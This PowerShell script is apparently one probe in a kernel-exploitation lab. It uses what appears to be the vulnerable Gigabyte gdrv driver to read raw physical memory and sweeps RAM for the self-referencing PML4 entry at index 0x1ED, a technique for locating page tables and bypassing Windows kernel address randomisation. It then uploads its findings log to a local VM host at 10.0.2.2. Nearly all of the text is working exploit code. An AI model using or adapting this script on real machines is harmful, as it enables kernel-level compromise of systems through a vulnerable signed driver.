# probeC.ps1 - VARIANT C: 0x1ED predicate over the WHOLE RAM span, with PML4 prefilters
#   prefilter: entry[0] present AND entry[0x1ED] present AND entry[255] present  => then exact self-ref test
$ErrorActionPreference = 'Continue'
[Net.ServicePointManager]::Expect100Continue = $false
$base = 'http://10.0.2.2:8080'
$d = $PSScriptRoot
$log = New-Object System.Collections.ArrayList
function L([string]$s) { $log.Add($s) | Out-Null }
try { Add-Type -Path (Join-Path $d 'p37_prov.cs') } catch { L ('COMPILE FAIL ' + $_.Exception.Message); $log -join "`r`n" | Set-Content "$d\probeC.out"; exit 1 }
$g = [IntPtr]::Zero
$e = [P37Prov]::GdrvOpen([ref]$g)
L ('open=' + $e)
if ($e -ne '') { $log -join "`r`n" | Set-Content "$d\probeC.out"; exit 1 }

$self = 0; $pre = 0; $hits = @(); $pages = 0
$t0 = Get-Date
$lo1 = [uint64]0x100000; $hi1 = [uint64]0x4000000
$lo2 = [uint64]0x40000000; $hi2 = [uint64]0xC0000000
for ($phase = 0; $phase -lt 2; $phase++) {
    if ($phase -eq 0) { $pa = $lo1; $hi = $hi1 } else { $pa = $lo2; $hi = $hi2 }
    while ($pa -lt $hi) {
        try { $b = [P37Prov]::GdrvReadOneRaw($g, $pa, 0x10000) } catch { $pa = $pa + 0x10000; continue }
        $pages++
        for ($o = 0; $o -lt 0x10000; $o += 0x1000) {
            $page = $pa + [uint64]$o
            $e0 = [BitConverter]::ToUInt64($b, $o)
            if (($e0 -band 1) -eq 0) { continue }
            $ef = [BitConverter]::ToUInt64($b, $o + 0x1ED * 8)
            if (($ef -band 1) -eq 0) { continue }
            $e255 = [BitConverter]::ToUInt64($b, $o + 255 * 8)
            if (($e255 -band 1) -eq 0) { continue }
            $pre++
            if (($ef -band 0x000FFFFFFFFFF000L) -eq $page) {
                $self++
                if ($hits.Count -lt 12) { $hits += ('page=0x{0:x} entry=0x{1:x}' -f $page, $ef) }
            }
        }
        $pa = $pa + 0x10000
    }
}
$secs = ((Get-Date) - $t0).TotalSeconds
L ('sweep 1M-64M + 1G-3G pages={0} prefilter_pass={1} self_referencing={2} in {3:N1}s' -f ($pages * 16), $pre, $self, $secs)
foreach ($h in $hits) { L ('  HIT ' + $h) }
if ($self -gt 0) { L 'VERDICT: predicate FIRES with extended range' } else { L 'VERDICT: still silent over whole RAM span' }

$body = $log -join "`r`n"
Set-Content -LiteralPath "$d\probeC.out" -Value $body
$tag = 'x'
try { $tag = (New-Object Net.WebClient).DownloadString("$base/active.txt").Trim() } catch { }
try { (New-Object Net.WebClient).UploadString("$base/log?vm=$tag", ("## probeC`r`n" + $body)) } catch { }
